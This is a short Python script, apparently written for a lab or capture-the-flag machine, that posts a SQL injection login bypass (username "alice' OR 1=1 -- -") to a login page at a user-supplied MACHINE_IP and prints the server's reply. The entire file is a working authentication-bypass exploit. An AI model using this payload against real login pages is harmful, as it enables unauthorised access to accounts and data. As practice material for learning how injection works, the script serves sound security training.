import requests
import os

# Get MACHINE_IP from environment variable or prompt user
machine_ip = os.getenv('MACHINE_IP')
if not machine_ip:
    machine_ip = input("Enter MACHINE_IP: ")

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = f"http://{machine_ip}:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)